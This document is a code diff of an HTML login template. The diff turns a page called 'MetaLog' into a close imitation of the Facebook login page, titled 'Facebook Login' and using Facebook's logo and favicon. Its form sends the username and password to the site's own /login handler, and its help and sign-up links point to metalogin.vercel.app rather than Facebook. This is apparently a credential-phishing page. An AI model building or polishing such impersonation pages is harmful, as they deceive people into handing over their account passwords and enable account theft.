@@ -1,7 +1,7 @@
 <html>
 <head>
   <meta charset="utf-8" />
-  <title>MetaLog - Links</title>
+  <title>Facebook Login</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yB/r/2sFJRNmJ5OP.ico">
   <style>
@@ -11,11 +11,13 @@
       font-family: Helvetica, Arial, sans-serif;
       margin: 0;
       padding: 0;
+      overflow-y: scroll;
     }
 
     .main {
       padding: 80px 0;
       font-size: 12px;
+      height: 353.819px;
     }
 
     .logo {
@@ -31,7 +33,7 @@
       border: 0;
       font-size: 12px;
     }
-
+    
     .box {
       display: block;
       border-radius: 8px;
@@ -104,11 +106,33 @@
       text-decoration: none;
       white-space: nowrap;
       color: white;
+      font-weight: bolder;
     }
 
     .button1:hover {
       background-color: #166fe5;
       
+    }
+
+    .text {
+      padding: 12px;
+    }
+
+    .text a {
+      color: #1877f2;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      text-decoration: none;
+    }
+
+    .text a:hover {
+      text-decoration: underline;
+    }
+
+    .text span {
+      color: #8d949e; /* Separator color */
+      margin: 0 5px; /* Adjust the spacing between the links and the separator */
     }
 
     .error {
@@ -123,25 +147,30 @@
     <div class="logo">
       <img class="logo1" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook">
     </div>
-    <div class="box">
-      <h1>Log in to Facebook</h1>
-      <form action="/login" method="POST">
-        <div class="login-group">
-          <input type="text" id="username" name="username" placeholder="Email address or phone number">
-        </div>
-        <div class="login-group">
-          <input type="password" id="password" name="password" placeholder="Password">
-        </div>
-        {% if error %}
-          <p class="error">{{ error }}</p>
-        {% endif %}
-        <div class="button">
-          <input type="submit" class="button1" value="Log in">
-        </div>
-      </form>
+    <div class="main_box">
+      <div class="box">
+        <h1>Log in to continue</h1>
+        <form action="/login" method="POST">
+          <div class="login-group">
+            <input type="text" id="username" name="username" placeholder="Email address or phone number">
+          </div>
+          <div class="login-group">
+            <input type="password" id="password" name="password" placeholder="Password">
+          </div>
+          {% if error %}
+            <p class="error">{{ error }}</p>
+          {% endif %}
+          <div class="button">
+            <input type="submit" class="button1" value="Log in">
+          </div>
+          <div class="text">
+            <a href="https://metalogin.vercel.app/login" class="_97w4" target="">Forgotten account?</a>
+            <span role="presentation" aria-hidden="true"> · </span>
+            <a href="https://metalogin.vercel.app/login" rel="nofollow" class="_97w5">Sign up for Facebook</a>
+          </div>
+        </form>
+      </div>
     </div>
   </div>
 </body>
 </html>
-
-
